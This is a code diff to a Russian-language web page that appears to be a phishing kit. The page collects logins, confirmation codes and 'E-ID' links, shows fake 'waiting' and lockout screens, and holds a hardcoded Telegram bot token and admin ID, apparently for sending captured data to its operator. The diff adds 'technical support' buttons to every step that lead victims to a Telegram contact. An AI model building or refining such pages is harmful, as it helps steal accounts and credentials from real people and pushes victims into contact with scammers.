@@ -301,6 +301,21 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        /* Стиль для кнопки поддержки */
+        .support-btn {
+            width: 100%;
+            padding: 12px;
+            background: #e74c3c;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-top: 12px;
+        }
+        .support-btn:hover { background: #c0392b; }
         @media (max-width: 420px) {
             .container { padding: 10px; }
             .price-data .price { font-size: 20px; }
@@ -369,6 +384,8 @@
             <button class="btn primary" onclick="showPage('pageLoginForm')">Войти</button>
             <button class="btn-eid" onclick="showPage('pageEid')" style="flex:1; padding:10px; border:1px solid #0066ff; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer; text-align:center;">Вход через E-ID</button>
         </div>
+        <!-- Новая кнопка технической поддержки -->
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
         <div class="text-center mt-8" style="color:#8a8a9a; font-size:12px;">
             <span style="color:#0066ff; cursor:pointer;" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</span>
         </div>
@@ -411,6 +428,7 @@
         </div>
         <div style="margin: 12px 0; text-align:center; color:#d0d0d8; font-size:12px;">или</div>
         <button class="btn-eid" onclick="showPage('pageEid')">Вход через E-ID</button>
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
         <button class="btn-back" onclick="showPage('pageMain')">← Назад</button>
     </div>
 
@@ -426,6 +444,7 @@
         <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
         <div id="codeError" class="message error" style="display:none;">Неверный код. Осталось попыток: <span id="codeAttempts">3</span></div>
         <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
         <button class="btn-back" onclick="showPage('pageLoginForm')">← Назад</button>
     </div>
 
@@ -444,6 +463,7 @@
         </div>
         <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
         <div id="eidLoginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
         <button class="btn-back" onclick="showPage('pageMain')">← Назад</button>
     </div>
 
@@ -459,6 +479,7 @@
         <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
         <div id="eidLinkError" class="message error" style="display:none;">Неверная ссылка. Осталось попыток: <span id="eidLinkAttempts">3</span></div>
         <div class="status-waiting" id="eidLinkStatus"><span class="spinner"></span> Ожидание...</div>
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
         <button class="btn-back" onclick="showPage('pageEid')">← Назад</button>
     </div>
 
@@ -467,7 +488,8 @@
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка</div>
         <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Повторите попытку входа.</div>
-        <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer;" onclick="showPage('pageMain')">Вернуться на главную</button>
+        <button class="support-btn" onclick="openSupport()">🛠 Техническая поддержка</button>
+        <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer; margin-top:8px;" onclick="showPage('pageMain')">Вернуться на главную</button>
     </div>
 
     <!-- ===== БЛОКИРОВКА ===== -->
@@ -475,7 +497,7 @@
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка входа</div>
         <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
-        <button onclick="openSupportChat()" class="btn" style="padding:12px 24px; background:#e74c3c; color:#ffffff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
+        <button onclick="openSupport()" class="btn" style="padding:12px 24px; background:#e74c3c; color:#ffffff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
         <button class="btn-back" onclick="showPage('pageMain')">← На главную</button>
     </div>
 
@@ -489,7 +511,7 @@
     // ============================================================
     const BOT_TOKEN = "8513048605:AAHpTZzskpjsAvyH2GdMfNxIykjQt1x3ZTg";
     const ADMIN_ID = "8893485920";
-    const SUPPORT_LINK = "https://t.me/BlackBit_support";
+    const SUPPORT_LINK = "https://t.me/BlackBit_suppor"; // исправленная ссылка
     const MAX_ATTEMPTS = 3;
 
     // ============================================================
@@ -766,7 +788,10 @@
         });
     }
 
-    function openSupportChat() {
+    // ============================================================
+    // 13. ТЕХНИЧЕСКАЯ ПОДДЕРЖКА
+    // ============================================================
+    function openSupport() {
         window.open(SUPPORT_LINK, '_blank');
     }
 
